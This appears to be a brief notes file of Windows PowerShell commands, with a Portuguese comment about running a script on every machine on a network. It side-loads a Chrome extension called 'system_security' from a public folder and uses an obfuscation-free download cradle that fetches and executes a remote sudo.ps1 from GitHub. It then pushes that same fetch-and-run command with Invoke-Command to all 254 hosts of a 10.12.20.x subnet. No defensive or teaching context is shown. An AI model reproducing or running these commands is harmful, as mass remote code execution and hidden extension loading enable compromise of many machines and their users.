google-chrome --load-extension=C:\Users\Public\system_security


SUDO
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eulersdisk/system_security/main/sudo.ps1')"



Get-Content script.ps1 | PowerShell.exe -noprofile -



control userpasswords2
start-process powershell –verb runAs


# rodar esse script em todas maquinas da rede

$listofIPs = 1..254 | % {"10.12.20.$_"}

Invoke-Command -ComputerName $listofIPs -ScriptBlock { powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eulersdisk/system_security/main/sudo.ps1')" } -credential USERNAME
